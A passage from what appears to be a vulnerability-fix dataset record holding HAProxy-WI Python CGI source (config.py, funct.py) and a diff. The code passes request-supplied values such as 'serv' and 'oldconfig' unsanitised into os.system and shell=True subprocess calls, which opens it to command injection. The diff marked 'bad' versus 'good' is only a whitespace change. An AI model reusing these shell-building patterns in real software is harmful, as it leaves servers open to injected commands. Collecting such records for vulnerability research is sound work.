\trole=sql.get_user_role_by_uuid(user_id.value) except: \tpass hap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') if serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct.get_data('config') +\".cfg\" if serv is not None and form.getvalue('open') is not None: \t \ttry: \t\tfunct.logging(serv, \"config.py open config\") \texcept: \t\tpass \t \terror=funct.get_config(serv, cfg) \t \ttry: \t\tconf=open(cfg, \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config') is not None: \ttry: \t\tfunct.logging(serv, \"config.py edited config\") \texcept: \t\tpass \t\t \tconfig=form.getvalue('config') \toldcfg=form.getvalue('oldconfig') \tsave=form.getvalue('save') \taftersave=1 \ttry: \t\twith open(cfg, \"a\") as conf: \t\t\tconf.write(config) \texcept IOError: \t\terror=\"Can't read import config file\" \t \tMASTERS=sql.is_master(serv) \tfor master in MASTERS: \t\tif master[0] !=None: \t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save) \t\t \tstderr=funct.upload_and_restart(serv, cfg, just_save=save) \t\t \tfunct.diff_config(oldcfg, cfg) \t \t \t \t \t \t\t \tos.system(\"/bin/rm -f \" +hap_configs_dir +\"*.old\") template=template.render(h2=1, title=\"Working with HAProxy configs\", \t\t\t\t\t\t\trole=role, \t\t\t\t\t\t\taction=\"config.py\", \t\t\t\t\t\t\tuser=user, \t\t\t\t\t\t\tselect_id=\"serv\", \t\t\t\t\t\t\tserv=serv, \t\t\t\t\t\t\taftersave=aftersave, \t\t\t\t\t\t\tconfig=config_read, \t\t\t\t\t\t\tcfg=cfg, \t\t\t\t\t\t\tselects=servers, \t\t\t\t\t\t\tstderr=stderr, \t\t\t\t\t\t\terror=error, \t\t\t\t\t\t\tnote=1, \t\t\t\t\t\t\ttoken=token) print(template) ", "sourceWithComments": "#!/usr/bin/env python3\nimport cgi\nimport os\nimport http.cookies\nimport funct\nimport sql\nfrom jinja2 import Environment, FileSystemLoader\nenv = Environment(loader=FileSystemLoader('templates/'))\ntemplate = env.get_template('config.html')\n\nprint('Content-type: text/html\\n')\nfunct.check_login()\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\nconfig_read = \"\"\ncfg = \"\"\nstderr = \"\"\nerror = \"\"\naftersave = \"\"\n\ntry:\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\tuser = sql.get_user_name_by_uuid(user_id.value)\n\tservers = sql.get_dick_permit()\n\ttoken = sql.get_token(user_id.value)\n\trole = sql.get_user_role_by_uuid(user_id.value)\nexcept:\n\tpass\n\nhap_configs_dir = funct.get_config_var('configs', 'haproxy_save_configs_dir')\n\nif serv is not None:\n\tcfg = hap_configs_dir + serv + \"-\" + funct.get_data('config') + \".cfg\"\n\nif serv is not None and form.getvalue('open') is not None :\n\t\n\ttry:\n\t\tfunct.logging(serv, \"config.py open config\")\n\texcept:\n\t\tpass\n\t\n\terror = funct.get_config(serv, cfg)\n\t\n\ttry:\n\t\tconf = open(cfg, \"r\")\n\t\tconfig_read = conf.read()\n\t\tconf.close\n\texcept IOError:\n\t\terror += '<br />Can\\'t read import config file'\n\n\tos.system(\"/bin/mv %s %s.old\" % (cfg, cfg))\t\n\nif serv is not None and form.getvalue('config') is not None:\n\ttry:\n\t\tfunct.logging(serv, \"config.py edited config\")\n\texcept:\n\t\tpass\n\t\t\n\tconfig = form.getvalue('config')\n\toldcfg = form.getvalue('oldconfig')\n\tsave = form.getvalue('save')\n\taftersave = 1\n\ttry:\n\t\twith open(cfg, \"a\") as conf:\n\t\t\tconf.write(config)\n\texcept IOError:\n\t\terror = \"Can't read import config file\"\n\t\n\tMASTERS = sql.is_master(serv)\n\tfor master in MASTERS:\n\t\tif master[0] != None:\n\t\t\tfunct.upload_and_restart(master[0], cfg, just_save=save)\n\t\t\n\tstderr = funct.upload_and_restart(serv, cfg, just_save=save)\n\t\t\n\tfunct.diff_config(oldcfg, cfg)\n\t\n\t#if save:\n\t#\tc = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t#\tc[\"restart\"] = form.getvalue('serv')\n\t#\tprint(c)\n\t\t\n\tos.system(\"/bin/rm -f \" + hap_configs_dir + \"*.old\")\n\n\ntemplate = template.render(h2 = 1, title = \"Working with HAProxy configs\",\n\t\t\t\t\t\t\trole = role,\n\t\t\t\t\t\t\taction = \"config.py\",\n\t\t\t\t\t\t\tuser = user,\n\t\t\t\t\t\t\tselect_id = \"serv\",\n\t\t\t\t\t\t\tserv = serv,\n\t\t\t\t\t\t\taftersave = aftersave,\n\t\t\t\t\t\t\tconfig = config_read,\n\t\t\t\t\t\t\tcfg = cfg,\n\t\t\t\t\t\t\tselects = servers,\n\t\t\t\t\t\t\tstderr = stderr,\n\t\t\t\t\t\t\terror = error,\n\t\t\t\t\t\t\tnote = 1,\n\t\t\t\t\t\t\ttoken = token)\nprint(template)"}, "/app/funct.py": {"changes": [{"diff": "\n \tgive_level = 1\n \tgive_level = kwargs.get(\"level\")\n \t\t\n-\tif not is_admin(level = give_level):\n+\tif not is_admin(level=give_level):\n \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n \t\timport sy", "add": 1, "remove": 1, "filename": "/app/funct.py", "badparts": ["\tif not is_admin(level = give_level):"], "goodparts": ["\tif not is_admin(level=give_level):"]}], "source": "\n\nimport cgi import os, sys form=cgi.FieldStorage() serv=form.getvalue('serv') def get_app_dir(): \td=sys.path[0] \td=d.split('/')[-1]\t\t \treturn sys.path[0] if d==\"app\" else os.path.dirname(sys.path[0])\t def get_config_var(sec, var): \tfrom configparser import ConfigParser, ExtendedInterpolation \ttry: \t\tpath_config=get_app_dir()+\"/haproxy-wi.cfg\" \t\tconfig=ConfigParser(interpolation=ExtendedInterpolation()) \t\tconfig.read(path_config) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>') \ttry: \t\treturn config.get(sec, var) \texcept: \t\tprint('Content-type: text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'))) \tif type=='config': \t\tfmt=\"%Y-%m-%d.%H:%M:%S\" \tif type=='logs': \t\tfmt='%Y%m%d' \tif type==\"date_in_log\": \t\tfmt=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists(log_path): \t\tos.makedirs(log_path) \t\t \ttry: \t\tIP=cgi.escape(os.environ[\"REMOTE_ADDR\"]) \t\tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \t\tuser_uuid=cookie.get('uuid') \t\tlogin=sql.get_user_name_by_uuid(user_uuid.value) \texcept: \t\tpass \t\t \tif kwargs.get('alerting')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/checker-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/keep_alive-\"+get_data('logs')+\".log\", \"a\") \telse: \t\tmess=get_data('date_in_log') +\" from \" +IP +\" user: \" +login +\" \" +action +\" for: \" +serv +\"\\n\" \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \ttry:\t \t\tlog.write(mess) \t\tlog.close \texcept IOError as e: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e) \t\tpass \t def telegram_send_mess(mess, **kwargs): \timport telebot \tfrom telebot import apihelper \timport sql \t \ttelegrams=sql.get_telegram_by_ip(kwargs.get('ip')) \tproxy=sql.get_setting('proxy') \t \tfor telegram in telegrams: \t\ttoken_bot=telegram[1] \t\tchannel_name=telegram[2] \t\t\t \tif proxy is not None: \t\tapihelper.proxy={'https': proxy} \ttry: \t\tbot=telebot.TeleBot(token=token_bot) \t\tbot.send_message(chat_id=channel_name, text=mess) \texcept: \t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_uuid=cookie.get('uuid') \tref=os.environ.get(\"SCRIPT_NAME\") \tsql.delete_old_uuid() \t \tif user_uuid is not None: \t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \t\t\t\t def is_admin(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass \tlevel=kwargs.get(\"level\") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept: \t\treturn False \t\tpass def page_for_admin(**kwargs): \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">') \t\timport sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name='' \tssh_user_password='' \t \tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3] \t\tssh_user_name=sshs[4] \t\tssh_user_password=sshs[5] \t\tssh_key_name=fullpath+'/keys/%s.pem' % sshs[2] \tservers=sql.select_servers(server=serv) \tfor server in servers: \t\tssh_port=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file(ssh_key_name) \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, pkey=k) \t\telse: \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, password=ssh_user_password) \t\treturn ssh \texcept paramiko.AuthenticationException: \t\treturn 'Authentication failed, please verify your credentials' \t\tpass \texcept paramiko.SSHException as sshException: \t\treturn 'Unable to establish SSH connection: %s ' % sshException \t\tpass \texcept paramiko.BadHostKeyException as badHostKeyException: \t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException \t\tpass \texcept Exception as e: \t\tif e==\"No such file or directory\": \t\t\treturn '%s. Check ssh key' % e \t\t\tpass \t\telif e==\"Invalid argument\": \t\t\terror='Check the IP of the server' \t\t\tpass \t\telse: \t\t\terror=e\t \t\t\tpass \t\treturn str(error) def get_config(serv, cfg, **kwargs): \timport sql \tconfig_path=\"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t \tssh=ssh_connect(serv) \ttry: \t\tsftp=ssh.open_sftp() \t\tsftp.get(config_path, cfg) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\tssh=str(e) \t\treturn ssh \t def diff_config(oldcfg, cfg): \tlog_path=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog=open(log_path +\"/config_edit-\"+get_data('logs')+\".log\", \"a\") \t\tlog.write(diff) \t\tlog.close \texcept IOError: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr) \t\tpass \t\t def install_haproxy(serv, **kwargs): \timport sql \tscript=\"install_haproxy.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tstats_port=sql.get_setting('stats_port') \tserver_state_file=sql.get_setting('server_state_file') \tstats_user=sql.get_setting('stats_user') \tstats_password=sql.get_setting('stats_password') \tproxy=sql.get_setting('proxy') \tos.system(\"cp scripts/%s.\" % script) \t \tproxy_serv=proxy if proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t\t\" SOCK_PORT=\"+haproxy_sock_port+\" STAT_PORT=\"+stats_port+\" STAT_FILE=\"+server_state_file+ \t\t\t\t\" STATS_USER=\"+stats_user+\" STATS_PASS=\"+stats_password] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \t\t \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t \tif kwargs.get('syn_flood')==\"1\": \t\tsyn_flood_protect(serv) \t def syn_flood_protect(serv, **kwargs): \timport sql \tscript=\"syn_flood_protect.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \t \tenable=\"disable\" if kwargs.get('enable')==\"0\" else \"disable\" \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" \"+enable] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \tssh_command(serv, commands, print_out=\"1\") \t def waf_install(serv, **kwargs): \timport sql \tscript=\"waf.sh\" \ttmp_config_path=sql.get_setting('tmp_config_path') \tproxy=sql.get_setting('proxy') \thaproxy_dir=sql.get_setting('haproxy_dir') \tver=check_haproxy_version(serv) \tos.system(\"cp scripts/%s.\" % script) \t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+script +\" PROXY=\" +proxy+ \t\t\t\t\" HAPROXY_PATH=\"+haproxy_dir +\" VERSION=\"+ver] \t \terror=str(upload(serv, tmp_config_path, script)) \tif error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \t \tstderr=ssh_command(serv, commands, print_out=\"1\") \tif stderr is None: \t\tsql.insert_waf_metrics_enable(serv, \"0\") def check_haproxy_version(serv): \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tver=\"\" \tcmd=\"echo 'show info' |nc %s %s |grep Version |awk '{print $2}'\" %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tfor line in output: \t\tver=line \treturn ver \t def upload(serv, path, file, **kwargs): \terror=\"\" \tfull_path=path +file \tif kwargs.get('dir')==\"fullpath\": \t\tfull_path=path \t \ttry: \t\tssh=ssh_connect(serv) \texcept Exception as e: \t\terror=e \t\tpass \ttry: \t\tsftp=ssh.open_sftp() \t\tfile=sftp.put(file, full_path) \t\tsftp.close() \t\tssh.close() \texcept Exception as e: \t\terror=e \t\tpass \t\t \treturn error \t def upload_and_restart(serv, cfg, **kwargs): \timport sql \ttmp_file=sql.get_setting('tmp_config_path') +\"/\" +get_data('config') +\".cfg\" \terror=\"\" \t \ttry: \t\tos.system(\"dos2unix \"+cfg) \texcept OSError: \t\treturn 'Please install dos2unix' \t\tpass \t \tif kwargs.get(\"keepalived\")==1: \t\tif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf\"] \t\telse: \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived\"] \telse: \t\tif kwargs.get(\"just_save\")==\"test\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo rm -f \" +tmp_file] \t\telif kwargs.get(\"just_save\")==\"save\": \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path')] \t\telse: \t\t\tcommands=[ \"sudo haproxy -q -c -f \" +tmp_file +\"&& sudo mv -f \" +tmp_file +\" \" +sql.get_setting('haproxy_config_path') +\" && sudo \" +sql.get_setting('restart_command')]\t \t\tif sql.get_setting('firewall_enable')==\"1\": \t\t\tcommands.extend(open_port_firewalld(cfg)) \t \terror +=str(upload(serv, tmp_file, cfg, dir='fullpath')) \ttry: \t\terror +=ssh_command(serv, commands) \texcept Exception as e: \t\terror +=e \tif error: \t\treturn error \t\t def open_port_firewalld(cfg): \ttry: \t\tconf=open(cfg, \"r\") \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ') \t\t\tbind=bind[1].split(\"ssl\") \t\t\tbind=bind[0].strip(' \\t\\n\\r') \t\t\tfirewalld_commands.append('sudo firewall-cmd --zone=public --add-port=%s/tcp --permanent' % bind) \t\t\t\t \tfirewalld_commands.append('sudo firewall-cmd --reload') \treturn firewalld_commands \t def check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout): \ti=0 \tfor line in stdout: \t\ti=i +1 \t\tline_class=\"line3\" if i % 2==0 else \"line\" \t\tprint('<div class=\"'+line_class+'\">' +escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line: \t\t\tfor k in line: \t\t\t\tproc_count=k.split(\":\")[1] \t\telse: \t\t\tproc_count=0 \treturn proc_count\t\t def ssh_command(serv, commands, **kwargs): \tssh=ssh_connect(serv) \t\t \tfor command in commands: \t\ttry: \t\t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\texcept: \t\t\tcontinue \t\t\t\t \t\tif kwargs.get(\"ip\")==\"1\": \t\t\tshow_ip(stdout) \t\telif kwargs.get(\"show_log\")==\"1\": \t\t\tshow_log(stdout) \t\telif kwargs.get(\"server_status\")==\"1\": \t\t\tserver_status(stdout) \t\telif kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\telif kwargs.get('retunr_err')==1: \t\t\treturn stderr.read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'>\"+line+\"</div>\") \ttry:\t \t\tssh.close() \texcept: \t\tprint(\"<div class='alert alert-danger' style='margin: 0;'>\"+str(ssh)+\"<a title='Close' id='errorMess'><b>X</b></a></div>\") \t\tpass def escape_html(text): \treturn cgi.escape(text, quote=True) \t def subprocess_execute(cmd): \timport subprocess \tp=subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, universal_newlines=True) \tstdout, stderr=p.communicate() \toutput=stdout.splitlines() \t \treturn output, stderr def show_backends(serv, **kwargs): \timport json \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tcmd='echo \"show backend\" |nc %s %s' %(serv, haproxy_sock_port) \toutput, stderr=subprocess_execute(cmd) \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"<br>\") \t\t \tif kwargs.get('ret'): \t\treturn ret \t\t def get_files(dir=get_config_var('configs', 'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse=True) \tif format=='cfg': \t\tfor file in files: \t\t\tip=file.split(\"-\") \t\t\tif serv==ip[0]: \t\t\t\treturn_files.add(file) \t\treturn sorted(return_files, reverse=True) \telse: \t\treturn files \t def get_key(item): \treturn item[0] ", "sourceWithComments": "# -*- coding: utf-8 -*-\"\nimport cgi\nimport os, sys\n\nform = cgi.FieldStorage()\nserv = form.getvalue('serv')\n\ndef get_app_dir():\n\td = sys.path[0]\n\td = d.split('/')[-1]\t\t\n\treturn sys.path[0] if d == \"app\" else os.path.dirname(sys.path[0])\t\n\ndef get_config_var(sec, var):\n\tfrom configparser import ConfigParser, ExtendedInterpolation\n\ttry:\n\t\tpath_config = get_app_dir()+\"/haproxy-wi.cfg\"\n\t\tconfig = ConfigParser(interpolation=ExtendedInterpolation())\n\t\tconfig.read(path_config)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file, whether it exists and the path. Must be: app/haproxy-webintarface.config</div>')\n\ttry:\n\t\treturn config.get(sec, var)\n\texcept:\n\t\tprint('Content-type: text/html\\n')\n\t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' % (sec, var))\n\t\t\t\t\t\ndef get_data(type):\n\tfrom datetime import datetime\n\tfrom pytz import timezone\n\timport sql\n\tnow_utc = datetime.now(timezone(sql.get_setting('time_zone')))\n\tif type == 'config':\n\t\tfmt = \"%Y-%m-%d.%H:%M:%S\"\n\tif type == 'logs':\n\t\tfmt = '%Y%m%d'\n\tif type == \"date_in_log\":\n\t\tfmt = \"%b %d %H:%M:%S\"\n\t\t\n\treturn now_utc.strftime(fmt)\n\t\t\t\ndef logging(serv, action, **kwargs):\n\timport sql\n\timport http.cookies\n\tlog_path = get_config_var('main', 'log_path')\n\tlogin = ''\n\t\n\tif not os.path.exists(log_path):\n\t\tos.makedirs(log_path)\n\t\t\n\ttry:\n\t\tIP = cgi.escape(os.environ[\"REMOTE_ADDR\"])\n\t\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\t\tuser_uuid = cookie.get('uuid')\n\t\tlogin = sql.get_user_name_by_uuid(user_uuid.value)\n\texcept:\n\t\tpass\n\t\t\n\tif kwargs.get('alerting') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/checker-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('metrics') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/metrics-\"+get_data('logs')+\".log\", \"a\")\n\telif kwargs.get('keep_alive') == 1:\n\t\tmess = get_data('date_in_log') + action + \"\\n\"\n\t\tlog = open(log_path + \"/keep_alive-\"+get_data('logs')+\".log\", \"a\")\n\telse:\n\t\tmess = get_data('date_in_log') + \" from \" + IP + \" user: \" + login + \" \" + action + \" for: \" + serv + \"\\n\"\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\ttry:\t\n\t\tlog.write(mess)\n\t\tlog.close\n\texcept IOError as e:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t write log. Please check log_path in config %e</div></center>' % e)\n\t\tpass\n\t\ndef telegram_send_mess(mess, **kwargs):\n\timport telebot\n\tfrom telebot import apihelper\n\timport sql\n\t\n\ttelegrams = sql.get_telegram_by_ip(kwargs.get('ip'))\n\tproxy = sql.get_setting('proxy')\n\t\n\tfor telegram in telegrams:\n\t\ttoken_bot = telegram[1]\n\t\tchannel_name = telegram[2]\n\t\t\t\n\tif proxy is not None:\n\t\tapihelper.proxy = {'https': proxy}\n\ttry:\n\t\tbot = telebot.TeleBot(token=token_bot)\n\t\tbot.send_message(chat_id=channel_name, text=mess)\n\texcept:\n\t\tprint(\"Fatal: Can't send message. Add Telegram chanel before use alerting at this servers group\")\n\t\tsys.exit()\n\t\ndef check_login(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_uuid = cookie.get('uuid')\n\tref = os.environ.get(\"SCRIPT_NAME\")\n\n\tsql.delete_old_uuid()\n\t\n\tif user_uuid is not None:\n\t\tsql.update_last_act_user(user_uuid.value)\n\t\tif sql.get_user_name_by_uuid(user_uuid.value) is None:\n\t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\telse:\n\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref)\n\t\t\t\t\ndef is_admin(**kwargs):\n\timport sql\n\timport http.cookies\n\tcookie = http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\"))\n\tuser_id = cookie.get('uuid')\n\ttry:\n\t\trole = sql.get_user_role_by_uuid(user_id.value)\n\texcept:\n\t\trole = 3\n\t\tpass\n\tlevel = kwargs.get(\"level\")\n\t\t\n\tif level is None:\n\t\tlevel = 1\n\t\t\n\ttry:\n\t\treturn True if role <= level else False\n\texcept:\n\t\treturn False\n\t\tpass\n\ndef page_for_admin(**kwargs):\n\tgive_level = 1\n\tgive_level = kwargs.get(\"level\")\n\t\t\n\tif not is_admin(level = give_level):\n\t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>')\n\t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">')\n\t\timport sys\n\t\tsys.exit()\n\t\t\t\t\ndef ssh_connect(serv, **kwargs):\n\timport paramiko\n\tfrom paramiko import SSHClient\n\timport sql\n\tfullpath = get_config_var('main', 'fullpath')\n\tssh_enable = ''\n\tssh_port = ''\n\tssh_user_name = ''\n\tssh_user_password = ''\n\t\n\tfor sshs in sql.select_ssh(serv=serv):\n\t\tssh_enable = sshs[3]\n\t\tssh_user_name = sshs[4]\n\t\tssh_user_password = sshs[5]\n\t\tssh_key_name = fullpath+'/keys/%s.pem' % sshs[2]\n\n\tservers = sql.select_servers(server=serv)\n\tfor server in servers:\n\t\tssh_port = server[10]\n\n\tssh = SSHClient()\n\tssh.load_system_host_keys()\n\tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n\ttry:\n\t\tif ssh_enable == 1:\n\t\t\tk = paramiko.RSAKey.from_private_key_file(ssh_key_name)\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, pkey = k)\n\t\telse:\n\t\t\tssh.connect(hostname = serv, port =  ssh_port, username = ssh_user_name, password = ssh_user_password)\n\t\treturn ssh\n\texcept paramiko.AuthenticationException:\n\t\treturn 'Authentication failed, please verify your credentials'\n\t\tpass\n\texcept paramiko.SSHException as sshException:\n\t\treturn 'Unable to establish SSH connection: %s ' % sshException\n\t\tpass\n\texcept paramiko.BadHostKeyException as badHostKeyException:\n\t\treturn 'Unable to verify server\\'s host key: %s ' % badHostKeyException\n\t\tpass\n\texcept Exception as e:\n\t\tif e == \"No such file or directory\":\n\t\t\treturn '%s. Check ssh key' % e\n\t\t\tpass\n\t\telif e == \"Invalid argument\":\n\t\t\terror = 'Check the IP of the server'\n\t\t\tpass\n\t\telse:\n\t\t\terror = e\t\n\t\t\tpass\n\t\treturn str(error)\n\ndef get_config(serv, cfg, **kwargs):\n\timport sql\n\n\tconfig_path = \"/etc/keepalived/keepalived.conf\" if kwargs.get(\"keepalived\") else sql.get_setting('haproxy_config_path')\t\n\tssh = ssh_connect(serv)\n\ttry:\n\t\tsftp = ssh.open_sftp()\n\t\tsftp.get(config_path, cfg)\n\t\tsftp.close()\n\t\tssh.close()\n\texcept Exception as e:\n\t\tssh = str(e)\n\t\treturn ssh\n\t\ndef diff_config(oldcfg, cfg):\n\tlog_path = get_config_var('main', 'log_path')\n\tdiff = \"\"\n\tdate = get_data('date_in_log') \n\tcmd=\"/bin/diff -ub %s %s\" % (oldcfg, cfg)\n\t\n\toutput, stderr = subprocess_execute(cmd)\n\t\n\tfor line in output:\n\t\tdiff += date + \" \" + line + \"\\n\"\n\ttry:\t\t\n\t\tlog = open(log_path + \"/config_edit-\"+get_data('logs')+\".log\", \"a\")\n\t\tlog.write(diff)\n\t\tlog.close\n\texcept IOError:\n\t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr)\n\t\tpass\n\t\t\ndef install_haproxy(serv, **kwargs):\n\timport sql\n\tscript = \"install_haproxy.sh\"\n\ttmp_config_path = sql.get_setting('tmp_config_path')\n\thaproxy_sock_port = sql.get_setting('haproxy_sock_port')\n\tstats_port = sql.get_setting('stats_port')\n\tserver_state_file = sql.get_setting('server_state_file')\n\tstats_user = sql.get_setting('stats_user')\n\tstats_password = sql.get_setting('stats_password')\n\tproxy = 